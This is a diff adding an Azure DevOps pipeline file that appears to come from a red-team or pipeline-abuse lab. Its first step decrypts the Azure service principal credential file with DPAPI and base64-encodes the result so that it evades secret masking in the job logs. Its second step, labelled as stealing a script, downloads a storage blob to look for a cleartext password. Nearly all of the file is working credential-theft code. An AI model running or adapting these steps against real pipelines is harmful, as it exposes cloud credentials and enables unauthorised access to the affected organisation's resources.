@@ -1,0 +1,47 @@
+trigger:
+- main
+
+pool:
+  name: default
+
+steps:
+- task: AzureCLI@2
+  displayName: "Dump service connection"
+  inputs:
+    azureSubscription: 'az-storage-svc_connection'
+    scriptType: 'ps'
+    scriptLocation: 'inlineScript'
+
+    # Dump Service Connection credential and base64 encode the output to evade secret masking
+    inlineScript: '
+    Add-Type -AssemblyName System.Security;
+    $spnBytes = [System.IO.File]::ReadAllBytes("$env:AZURE_CONFIG_DIR\service_principal_entries.bin"); 
+
+    <# Use DPAPI to decrypt service_principal_entries.bin #>
+    $spnText = [Text.Encoding]::ASCII.GetString([Security.Cryptography.ProtectedData]::Unprotect($spnBytes, $null, "CurrentUser"));
+
+    <# 
+    Write cleartext output of service_principal_entries.bin
+    Observe secret masking in the job output log 
+    #>
+    write-output $spnText;
+
+    <# 
+    Base64 encode the service principal credential to bypass secret masking
+    Decode Base64 command: [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("[BASE64_TEXT]"));
+    #>
+    [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($spnText));
+    '
+
+- task: AzureCLI@2
+  displayName: "Steal .ps1 script from storage account"
+  inputs:
+    azureSubscription: 'az-storage-svc_connection'
+    scriptType: 'batch'
+    scriptLocation: 'inlineScript'
+    failOnStandardError: false
+
+    # Download the configure-registry.ps1 script and find the cleartext password
+    inlineScript: '
+    az storage blob download -c windows-install-scripts -n configure-registry.ps1 --account-name sbstrgacct01
+    '
